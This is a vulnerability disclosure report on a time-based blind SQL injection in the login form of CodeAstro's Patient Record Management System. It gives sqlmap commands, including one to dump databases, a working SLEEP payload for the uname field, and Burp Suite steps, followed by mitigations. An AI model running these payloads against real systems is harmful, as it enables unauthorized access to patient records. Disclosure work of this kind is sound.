# 🧾 Vulnerability Report – SQL Injection in PRMS Login Portal

**Author:** Subhash Paudel  
**Date:** 29 June 2025  
**Source:** `https://codeastro.com/patient-record-management-system-in-php-mysql-with-source-code/`
**Target URL:** `http://localhost/PRMS-php/login.php`  
**Project Source:** CodeAstro  
**Version:** 1.0  
**Severity:** Critical  
**Technology Stack:** Apache 2.4.58, PHP 8.0.30, MariaDB (MySQL ≥ 5.0.12)

---

## 🧩 Summary

A **Time-Based Blind SQL Injection** vulnerability was discovered in the login portal of the Patient Record Management System (PRMS), developed by CodeAstro. The vulnerability allows unauthenticated attackers to inject arbitrary SQL commands, enabling unauthorized access, data extraction, and potentially full compromise of the database.

---

## 🔐 Authentication (For Testing)

- **Username:** `liam`  
- **Password:** `Password@123`  
- **Login Page:** [http://localhost/PRMS-php/](http://localhost/PRMS-php/)

![Login Page](https://github.com/user-attachments/assets/df0a6607-4320-411b-b80e-8864e66a7574)

---

## 🚨 Vulnerable Endpoint

| HTTP Method | Endpoint URL                          | Affected Parameter |
|-------------|----------------------------------------|--------------------|
| POST        | `http://localhost/PRMS-php/login.php` | `uname`            |

---

## ⚙️ Automated Exploitation (SQLMap)

```bash
sqlmap -u "http://localhost/PRMS-php/login.php?uname=test" \
--data="uname=test&psw=123" --batch --level=5 --risk=3
```
![image](https://github.com/user-attachments/assets/dacd08b7-c05e-49c7-979b-c9ef2c2386c6)

**SQLMap Result:**
- Injection Type: **Time-Based Blind**
- DBMS: **MySQL (MariaDB)**
- Injection Confirmed

**Payload Used:**
```sql
uname=admin41839116' AND (SELECT 8601 FROM (SELECT(SLEEP(5)))pSRM) AND 'eHel'='eHel&psw=Password@123
```

### 📂 Database Dump Example

To dump the databases:
```bash
sqlmap -u "http://localhost/PRMS-php/login.php" \
--data="uname=admin&psw=Password@123" \
--dbs --batch
```

![SQLMap Dump](https://github.com/user-attachments/assets/6d6e6756-e4ad-47eb-b887-a8daf0d43ab5)

---

## 🧪 Manual Exploitation (For Educational Purposes Only)

### 1. Intercept the Request
- Use Burp Suite to capture login request with dummy credentials:
```http
POST /PRMS-php/login.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

uname=admin&psw=Password@123
```
![Burp Repeater Payload](https://github.com/user-attachments/assets/d1995966-8ffc-43f8-8f9c-96587855745b)


### 2. Modify the Payload in Burp Repeater
Change `uname` to:
```sql
admin41839116' AND (SELECT 8601 FROM (SELECT(SLEEP(5)))pSRM) AND 'eHel'='eHel
```

### 3. Send and Observe
Click **Send** in Repeater. A **5-second delay** confirms the injection point.

![Burp Delay Response](https://github.com/user-attachments/assets/00ff9b95-837b-4aae-a847-b16edde12bf0)

---

## ⚠️ Security Risks

| Risk                        | Description                                                                 |
|-----------------------------|-----------------------------------------------------------------------------|
| Unauthorized Access         | Bypass authentication and log in as any user including administrators.      |
| Data Breach                 | Dump sensitive user, patient, or medical records.                          |
| System Compromise           | Modify or delete records, inject malicious data, or gain RCE (indirectly). |
| Regulatory Non-compliance   | May violate HIPAA, GDPR, or other data protection laws.                    |

---

## 🛡️ Mitigation & Recommendations

| Type            | Recommendation                                                                 |
|-----------------|---------------------------------------------------------------------------------|
| Input Validation| Use parameterized queries / prepared statements in PHP (e.g., PDO or MySQLi).  |
| WAF             | Deploy a Web Application Firewall to block SQLi patterns.                      |
| Least Privilege | Restrict DB user permissions; avoid using root-level DB users for apps.        |
| Logging         | Log all failed login attempts and monitor for injection patterns.              |
| Secure Errors   | Disable verbose error messages that could help attackers.                      |
| Code Review     | Conduct manual code review and static analysis for user input handling.        |

---

## 🏁 Conclusion

This SQL injection flaw is highly exploitable and critically dangerous. It can result in full database compromise without authentication. Immediate remediation is strongly advised.

---

## 📚 References

- [OWASP SQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLMap Official Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
